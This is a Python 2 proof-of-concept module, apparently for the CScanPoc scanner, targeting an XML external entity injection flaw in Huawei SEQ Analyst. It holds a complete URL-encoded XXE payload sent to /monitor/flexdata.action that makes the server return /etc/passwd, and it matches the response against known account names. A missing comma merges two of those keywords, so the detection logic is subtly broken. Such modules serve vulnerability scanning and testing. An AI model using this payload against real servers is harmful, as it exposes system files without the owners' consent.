# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Huawei_0006' # 平台漏洞编号，留空
    name = 'Huawei SEQ Analyst - XML External Entity Injection XML注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-15'  # 漏洞公布时间
    desc = '''
        SEQ Analyst is a platform for business quality monitoring and management by
        individual user and multiple vendors in a quasi-realtime and retraceable manner.

        Huawei SEQ Analyst - XML External Entity Injection XML注入漏洞。
    ''' # 漏洞描述
    ref = 'http://seclists.org/fulldisclosure/2015/Apr/42' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '华为软件'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '81b0b4c8-9573-4b63-bc2b-d6a61e9632c3'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}'.format(target=self.target)+'/monitor/flexdata.action'
            payload = '<!DOCTYPE%20foo%20[<!ENTITY%20xxe00c70%20SYSTEM%20"file%3a%2f%2f%2fetc%2fpasswd">%20]><Req>%0a%20%20<command>bizLicenseSetting%26xxe00c70%3b<%2fcommand>%0a<%2fReq>&rdm=Tue%20Mar%203%2008%3A45%3A50%20GMT%2B0200%202015'
            keywords = ('bizLicenseSettingnobody',
                'daemon',
                'ftp',
                'root',
                'messagebus',
                'ntp',
                'ftpsecure',
                'sshd',
                'webserver',
                'ecmftp',
                'httpd',
                'cognos',
                'ftptrace'
                'ftpsoc')
                       
            code, head, res, body, _ = hh.http('-d %s %s' % (payload, url))
            if code == 200:
                flag=False
                for i in range(len(keywords)):
                    if keywords[i] not in res:
                        flag=True
                        break#只要有一个key不在里面就不存在漏洞
                if flag==False:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()